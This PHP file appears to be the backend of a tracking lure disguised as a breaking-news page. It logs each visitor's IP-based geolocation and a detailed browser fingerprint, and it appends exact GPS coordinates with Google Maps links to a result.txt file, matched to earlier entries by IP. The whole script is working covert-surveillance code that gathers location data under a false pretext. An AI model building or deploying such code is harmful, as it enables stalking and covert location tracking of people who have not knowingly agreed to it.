<?php

// Load MaxMind GeoIP2 library (if available)
if (file_exists(__DIR__ . '/../../vendor/autoload.php')) {
    require_once __DIR__ . '/../../vendor/autoload.php';
}

// Function to get client IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    
    // Handle multiple IPs (from proxy)
    if (strpos($ipaddress, ',') !== false) {
        $ipaddress = explode(',', $ipaddress)[0];
    }
    
    return trim($ipaddress);
}

// Function to lookup GeoIP using mmdb file (if available) or API fallback
function getGeoIPInfo($ip) {
    $geoInfo = array(
        // Location Data
        'latitude' => 'Unknown',
        'longitude' => 'Unknown',
        'accuracy_radius' => 'Unknown',
        'city_name' => 'Unknown',
        'postal_code' => 'Unknown',
        'time_zone' => 'Unknown',
        
        // Geographic Hierarchy
        'continent_code' => 'Unknown',
        'continent_name' => 'Unknown',
        'country_iso_code' => 'Unknown',
        'country_name' => 'Unknown',
        'subdivision_1_iso_code' => 'Unknown',
        'subdivision_1_name' => 'Unknown',
        'subdivision_2_iso_code' => 'Unknown',
        'subdivision_2_name' => 'Unknown',
        'is_in_european_union' => 'Unknown',
        
        // Additional Info
        'isp' => 'Unknown',
        'org' => 'Unknown',
        'asn' => 'Unknown',
        'source' => 'Unknown'
    );
    
    // Check if geoip.mmdb exists
    $mmdbPath = __DIR__ . '/../../geoip.mmdb';
    if (file_exists($mmdbPath)) {
        // Try to use MaxMind GeoIP2 library if available
        if (class_exists('GeoIp2\Database\Reader')) {
            try {
                $reader = new GeoIp2\Database\Reader($mmdbPath);
                $record = $reader->city($ip);
                
                // Location Data
                $geoInfo['latitude'] = $record->location->latitude ?? 'Unknown';
                $geoInfo['longitude'] = $record->location->longitude ?? 'Unknown';
                $geoInfo['accuracy_radius'] = $record->location->accuracyRadius ?? 'Unknown';
                $geoInfo['city_name'] = $record->city->name ?? 'Unknown';
                $geoInfo['postal_code'] = $record->postal->code ?? 'Unknown';
                $geoInfo['time_zone'] = $record->location->timeZone ?? 'Unknown';
                
                // Geographic Hierarchy
                $geoInfo['continent_code'] = $record->continent->code ?? 'Unknown';
                $geoInfo['continent_name'] = $record->continent->name ?? 'Unknown';
                $geoInfo['country_iso_code'] = $record->country->isoCode ?? 'Unknown';
                $geoInfo['country_name'] = $record->country->name ?? 'Unknown';
                $geoInfo['is_in_european_union'] = isset($record->country->isInEuropeanUnion) ? ($record->country->isInEuropeanUnion ? 'Yes' : 'No') : 'Unknown';
                
                // Subdivision 1 (State/Province)
                if (isset($record->subdivisions[0])) {
                    $geoInfo['subdivision_1_iso_code'] = $record->subdivisions[0]->isoCode ?? 'Unknown';
                    $geoInfo['subdivision_1_name'] = $record->subdivisions[0]->name ?? 'Unknown';
                }
                
                // Subdivision 2 (County)
                if (isset($record->subdivisions[1])) {
                    $geoInfo['subdivision_2_iso_code'] = $record->subdivisions[1]->isoCode ?? 'Unknown';
                    $geoInfo['subdivision_2_name'] = $record->subdivisions[1]->name ?? 'Unknown';
                }
                
                // ISP/Org (if available in database)
                if (isset($record->traits->isp)) {
                    $geoInfo['isp'] = $record->traits->isp;
                }
                if (isset($record->traits->organization)) {
                    $geoInfo['org'] = $record->traits->organization;
                }
                if (isset($record->traits->autonomousSystemNumber)) {
                    $geoInfo['asn'] = $record->traits->autonomousSystemNumber;
                }
                
                $geoInfo['source'] = 'MaxMind MMDB';
            } catch (Exception $e) {
                // Fallback to API
                $geoInfo = getGeoIPFromAPI($ip);
            }
        } else {
            // Try alternative mmdb reader or fallback to API
            $geoInfo = getGeoIPFromAPI($ip);
        }
    } else {
        // Use API fallback
        $geoInfo = getGeoIPFromAPI($ip);
    }
    
    return $geoInfo;
}

// Fallback function to get GeoIP from API
function getGeoIPFromAPI($ip) {
    $geoInfo = array(
        // Location Data
        'latitude' => 'Unknown',
        'longitude' => 'Unknown',
        'accuracy_radius' => 'Unknown',
        'city_name' => 'Unknown',
        'postal_code' => 'Unknown',
        'time_zone' => 'Unknown',
        
        // Geographic Hierarchy
        'continent_code' => 'Unknown',
        'continent_name' => 'Unknown',
        'country_iso_code' => 'Unknown',
        'country_name' => 'Unknown',
        'subdivision_1_iso_code' => 'Unknown',
        'subdivision_1_name' => 'Unknown',
        'subdivision_2_iso_code' => 'Unknown',
        'subdivision_2_name' => 'Unknown',
        'is_in_european_union' => 'Unknown',
        
        // Additional Info
        'isp' => 'Unknown',
        'org' => 'Unknown',
        'asn' => 'Unknown',
        'source' => 'API Fallback'
    );
    
    // Try ip-api.com (free, no key required) - Enhanced fields
    $url = "http://ip-api.com/json/{$ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode == 200 && $response) {
        $data = json_decode($response, true);
        if ($data && isset($data['status']) && $data['status'] == 'success') {
            // Location Data
            $geoInfo['latitude'] = $data['lat'] ?? 'Unknown';
            $geoInfo['longitude'] = $data['lon'] ?? 'Unknown';
            $geoInfo['accuracy_radius'] = 'N/A (API)'; // API doesn't provide accuracy radius
            $geoInfo['city_name'] = $data['city'] ?? 'Unknown';
            $geoInfo['postal_code'] = $data['zip'] ?? 'Unknown';
            $geoInfo['time_zone'] = $data['timezone'] ?? 'Unknown';
            
            // Geographic Hierarchy
            $geoInfo['continent_code'] = $data['continentCode'] ?? 'Unknown';
            $geoInfo['continent_name'] = $data['continent'] ?? 'Unknown';
            $geoInfo['country_iso_code'] = $data['countryCode'] ?? 'Unknown';
            $geoInfo['country_name'] = $data['country'] ?? 'Unknown';
            $geoInfo['subdivision_1_name'] = $data['regionName'] ?? 'Unknown';
            $geoInfo['subdivision_1_iso_code'] = $data['region'] ?? 'Unknown';
            
            // Check if country is in EU (common EU countries)
            $euCountries = array('AT', 'BE', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 'DE', 'GR', 'HU', 'IE', 'IT', 'LV', 'LT', 'LU', 'MT', 'NL', 'PL', 'PT', 'RO', 'SK', 'SI', 'ES', 'SE');
            $geoInfo['is_in_european_union'] = in_array($geoInfo['country_iso_code'], $euCountries) ? 'Yes' : 'No';
            
            // Additional Info
            $geoInfo['isp'] = $data['isp'] ?? 'Unknown';
            $geoInfo['org'] = $data['org'] ?? 'Unknown';
            $geoInfo['asn'] = $data['as'] ?? 'Unknown';
            $geoInfo['source'] = 'ip-api.com';
        }
    }
    
    return $geoInfo;
}

if($_SERVER['REQUEST_METHOD'] == "POST"){
    
    // Define log file path
    $logFile = __DIR__ . '/result.txt';
    
    // Handle GPS location update (updates existing log entry)
    if (isset($_POST['action']) && $_POST['action'] == 'update_gps_location') {
        $clientIP = getClientIP();
        $gpsLat = isset($_POST['latitude']) ? $_POST['latitude'] : '';
        $gpsLon = isset($_POST['longitude']) ? $_POST['longitude'] : '';
        $gpsAccuracy = isset($_POST['accuracy']) ? $_POST['accuracy'] : '';
        $gpsTimestamp = isset($_POST['timestamp']) ? $_POST['timestamp'] : date('Y-m-d H:i:s');
        $newsId = isset($_POST['news_id']) ? $_POST['news_id'] : 'N/A';
        $newsTitle = isset($_POST['news_title']) ? $_POST['news_title'] : 'Unknown News';
        
        if ($gpsLat && $gpsLon && file_exists($logFile)) {
            $logContent = file_get_contents($logFile);
            
            // Find the most recent entry for this IP
            $entries = preg_split('/\[VISITOR FINGERPRINT - BREAKING NEWS TEMPLATE\]/', $logContent);
            $found = false;
            
            // Search from the end (most recent entries first)
            for ($i = count($entries) - 1; $i >= 0; $i--) {
                if (trim($entries[$i]) == '') continue;
                
                // Check if this entry matches the IP
                if (preg_match('/Public IP Address: ' . preg_quote($clientIP, '/') . '/', $entries[$i])) {
                    // Update this entry with GPS location
                    $gpsUpdate = "\n";
                    $gpsUpdate .= "=== GPS LOCATION UPDATE ===\n";
                    $gpsUpdate .= "GPS Update Timestamp: " . date('Y-m-d H:i:s') . "\n";
                    $gpsUpdate .= "GPS Update ISO Timestamp: {$gpsTimestamp}\n";
                    $gpsUpdate .= "News ID: {$newsId}\n";
                    $gpsUpdate .= "News Title: {$newsTitle}\n";
                    $gpsUpdate .= "--- Exact GPS Location (User Granted) ---\n";
                    $gpsUpdate .= "Exact GPS Latitude: {$gpsLat}\n";
                    $gpsUpdate .= "Exact GPS Longitude: {$gpsLon}\n";
                    $gpsUpdate .= "GPS Accuracy: {$gpsAccuracy} meters\n";
                    $gpsUpdate .= "Google Maps (Exact): https://www.google.com/maps?q={$gpsLat},{$gpsLon}\n";
                    $gpsUpdate .= "Location Source: GPS (User Granted - Exact Location)\n";
                    $gpsUpdate .= "Note: GPS coordinates are more accurate than GeoIP coordinates above\n";
                    $gpsUpdate .= "========================================\n";
                    
                    // Insert GPS update before the separator
                    $entries[$i] = $entries[$i] . $gpsUpdate;
                    $found = true;
                    break;
                }
            }
            
            if ($found) {
                // Reconstruct log file
                $newContent = implode('[VISITOR FINGERPRINT - BREAKING NEWS TEMPLATE]', $entries);
                file_put_contents($logFile, $newContent);
                
                header('Content-Type: application/json');
                echo json_encode(array('status' => 'success', 'message' => 'GPS location updated in existing log entry'));
            } else {
                // No matching entry found, create new entry
                $gpsEntry = "\n[GPS LOCATION UPDATE - NO MATCHING ENTRY FOUND]\n";
                $gpsEntry .= "IP Address: {$clientIP}\n";
                $gpsEntry .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
                $gpsEntry .= "Exact GPS Latitude: {$gpsLat}\n";
                $gpsEntry .= "Exact GPS Longitude: {$gpsLon}\n";
                $gpsEntry .= "GPS Accuracy: {$gpsAccuracy} meters\n";
                $gpsEntry .= "News ID: {$newsId}\n";
                $gpsEntry .= "News Title: {$newsTitle}\n";
                $gpsEntry .= "Google Maps: https://www.google.com/maps?q={$gpsLat},{$gpsLon}\n";
                $gpsEntry .= "========================================\n\n";
                
                file_put_contents($logFile, $gpsEntry, FILE_APPEND);
                
                header('Content-Type: application/json');
                echo json_encode(array('status' => 'warning', 'message' => 'No matching entry found, created new GPS entry'));
            }
        } else {
            header('Content-Type: application/json');
            echo json_encode(array('status' => 'error', 'message' => 'Missing GPS coordinates or log file not found'));
        }
        exit;
    }
    
    // Handle visitor fingerprinting
    if (isset($_POST['action']) && $_POST['action'] == 'visitor_fingerprint') {
        $fingerprint = json_decode($_POST['fingerprint'], true);
        $clientIP = getClientIP();
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        // Define log file path if not already defined
        if (!isset($logFile)) {
            $logFile = __DIR__ . '/result.txt';
        }
        
        // Get GeoIP information
        $geoInfo = getGeoIPInfo($clientIP);
        
        // Build comprehensive log entry
        $logData = "[VISITOR FINGERPRINT - BREAKING NEWS TEMPLATE]\n";
        $logData .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $logData .= "ISO Timestamp: " . ($fingerprint['timestamp'] ?? date('c')) . "\n";
        $logData .= "Collection Time: " . ($fingerprint['collectionTime'] ?? date('Y-m-d H:i:s')) . "\n";
        $logData .= "\n";
        $logData .= "=== IP ADDRESS & GEOIP INFORMATION ===\n";
        $logData .= "Public IP Address: {$clientIP}\n";
        $logData .= "GeoIP Source: {$geoInfo['source']}\n";
        $logData .= "\n";
        $logData .= "--- Location Data (GeoIP - Approximate) ---\n";
        $logData .= "Latitude (GeoIP): {$geoInfo['latitude']}\n";
        $logData .= "Longitude (GeoIP): {$geoInfo['longitude']}\n";
        $logData .= "Accuracy Radius: {$geoInfo['accuracy_radius']} km\n";
        $logData .= "City Name: {$geoInfo['city_name']}\n";
        $logData .= "Postal Code: {$geoInfo['postal_code']}\n";
        $logData .= "Time Zone (IANA): {$geoInfo['time_zone']}\n";
        $logData .= "Location Source: GeoIP (IP-based, approximate location)\n";
        $logData .= "GPS Location: Pending (will be updated if user grants GPS permission)\n";
        $logData .= "\n";
        $logData .= "--- Geographic Hierarchy ---\n";
        $logData .= "Continent Code: {$geoInfo['continent_code']}\n";
        $logData .= "Continent Name: {$geoInfo['continent_name']}\n";
        $logData .= "Country ISO Code: {$geoInfo['country_iso_code']}\n";
        $logData .= "Country Name: {$geoInfo['country_name']}\n";
        $logData .= "Subdivision 1 (State/Province) ISO Code: {$geoInfo['subdivision_1_iso_code']}\n";
        $logData .= "Subdivision 1 (State/Province) Name: {$geoInfo['subdivision_1_name']}\n";
        $logData .= "Subdivision 2 (County) ISO Code: {$geoInfo['subdivision_2_iso_code']}\n";
        $logData .= "Subdivision 2 (County) Name: {$geoInfo['subdivision_2_name']}\n";
        $logData .= "Is in European Union: {$geoInfo['is_in_european_union']}\n";
        $logData .= "\n";
        $logData .= "--- Network Information ---\n";
        $logData .= "ISP: {$geoInfo['isp']}\n";
        $logData .= "Organization: {$geoInfo['org']}\n";
        $logData .= "ASN: {$geoInfo['asn']}\n";
        $logData .= "\n";
        $logData .= "=== BROWSER INFORMATION ===\n";
        $logData .= "User Agent: {$userAgent}\n";
        $logData .= "Browser: " . ($fingerprint['browser'] ?? 'Unknown') . "\n";
        $logData .= "Browser Version: " . ($fingerprint['browserVersion'] ?? 'Unknown') . "\n";
        $logData .= "Platform: " . ($fingerprint['platform'] ?? 'Unknown') . "\n";
        $logData .= "\n";
        $logData .= "=== OPERATING SYSTEM ===\n";
        $logData .= "OS: " . ($fingerprint['os'] ?? 'Unknown') . "\n";
        $logData .= "OS Version: " . ($fingerprint['osVersion'] ?? 'Unknown') . "\n";
        $logData .= "CPU: " . ($fingerprint['cpu'] ?? 'Unknown') . "\n";
        $logData .= "\n";
        $logData .= "=== SCREEN & DISPLAY ===\n";
        $logData .= "Screen Resolution: " . ($fingerprint['screenWidth'] ?? 'Unknown') . "x" . ($fingerprint['screenHeight'] ?? 'Unknown') . "\n";
        $logData .= "Available Resolution: " . ($fingerprint['screenAvailWidth'] ?? 'Unknown') . "x" . ($fingerprint['screenAvailHeight'] ?? 'Unknown') . "\n";
        $logData .= "Color Depth: " . ($fingerprint['colorDepth'] ?? 'Unknown') . " bits\n";
        $logData .= "Pixel Depth: " . ($fingerprint['pixelDepth'] ?? 'Unknown') . " bits\n";
        $logData .= "Device XDPI: " . ($fingerprint['deviceXDPI'] ?? 'Unknown') . "\n";
        $logData .= "Device YDPI: " . ($fingerprint['deviceYDPI'] ?? 'Unknown') . "\n";
        $logData .= "\n";
        $logData .= "=== HARDWARE INFORMATION ===\n";
        $logData .= "CPU Cores: " . ($fingerprint['hardwareConcurrency'] ?? 'Unknown') . "\n";
        $logData .= "Device Memory: " . ($fingerprint['deviceMemory'] ?? 'Unknown') . " GB\n";
        $logData .= "Max Touch Points: " . ($fingerprint['maxTouchPoints'] ?? 'Unknown') . "\n";
        $logData .= "\n";
        $logData .= "=== FINGERPRINTING ===\n";
        $logData .= "Canvas Fingerprint: " . ($fingerprint['canvasFingerprint'] ?? 'Not Available') . "\n";
        $logData .= "WebGL Fingerprint: " . ($fingerprint['webglFingerprint'] ?? 'Not Available') . "\n";
        $logData .= "\n";
        $logData .= "=== PLUGINS & MIME TYPES ===\n";
        $logData .= "Plugins: " . ($fingerprint['plugins'] ?? 'None') . "\n";
        $logData .= "MIME Types: " . ($fingerprint['mimeTypes'] ?? 'None') . "\n";
        $logData .= "\n";
        $logData .= "=== STORAGE & PRIVACY ===\n";
        $logData .= "Local Storage: " . ($fingerprint['localStorage'] ?? 'Unknown') . "\n";
        $logData .= "Session Storage: " . ($fingerprint['sessionStorage'] ?? 'Unknown') . "\n";
        $logData .= "Cookies Enabled: " . ($fingerprint['cookiesEnabled'] ?? 'Unknown') . "\n";
        $logData .= "Do Not Track: " . ($fingerprint['doNotTrack'] ?? 'Unknown') . "\n";
        $logData .= "\n";
        $logData .= "=== LOCALE & TIMEZONE ===\n";
        $logData .= "Timezone: " . ($fingerprint['timeZone'] ?? 'Unknown') . "\n";
        $logData .= "Timezone Offset: " . ($fingerprint['timezoneOffset'] ?? 'Unknown') . " minutes\n";
        $logData .= "Language: " . ($fingerprint['language'] ?? 'Unknown') . "\n";
        $logData .= "Languages: " . ($fingerprint['languages'] ?? 'Unknown') . "\n";
        $logData .= "\n";
        $logData .= "=== NETWORK INFORMATION ===\n";
        $logData .= "Connection Info: " . ($fingerprint['connectionInfo'] ?? 'Unknown') . "\n";
        $logData .= "Network Type: " . ($fingerprint['networkType'] ?? 'Unknown') . "\n";
        $logData .= "Effective Type: " . ($fingerprint['effectiveType'] ?? 'Unknown') . "\n";
        $logData .= "Downlink: " . ($fingerprint['downlink'] ?? 'Unknown') . " Mbps\n";
        $logData .= "RTT: " . ($fingerprint['rtt'] ?? 'Unknown') . " ms\n";
        $logData .= "\n";
        $logData .= "=== PAGE INFORMATION ===\n";
        $logData .= "Page URL: " . ($fingerprint['pageURL'] ?? 'Unknown') . "\n";
        $logData .= "Referrer: " . ($fingerprint['referrer'] ?? 'Direct Visit') . "\n";
        $logData .= "\n";
        $logData .= "========================================\n";
        $logData .= "\n";
        
        file_put_contents("result.txt", $logData, FILE_APPEND);
        
        // Return success response
        header('Content-Type: application/json');
        echo json_encode(array('status' => 'success', 'message' => 'Fingerprint logged'));
        exit;
    }
    
    // Handle regular location data (existing functionality)
    if (isset($_POST['data'])) {
        $data = $_POST['data'];
        // Append to result.txt to preserve all logs
        $logEntry = $data . "\n";
        file_put_contents("result.txt", $logEntry, FILE_APPEND);
    }
}

?>

